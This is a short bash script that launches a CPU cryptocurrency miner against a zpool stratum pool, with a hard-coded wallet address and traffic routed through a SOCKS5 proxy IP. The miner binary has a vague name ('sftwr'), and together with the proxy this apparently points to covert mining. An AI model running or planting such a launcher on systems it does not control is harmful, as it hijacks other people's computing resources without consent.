#!/bin/bash
POOL=stratum+tcp://cpupower.eu.mine.zpool.ca:6240
WALLET=D6ZLGf67ndSfdDZz2uPgLB2Hpi1MeuHnnD
PROXY=socks5://176.9.119.170:1080
./sftwr -a cpupower -o $POOL -u $WALLET.p -p c=DGB,zap=VRSC -x $PROXY
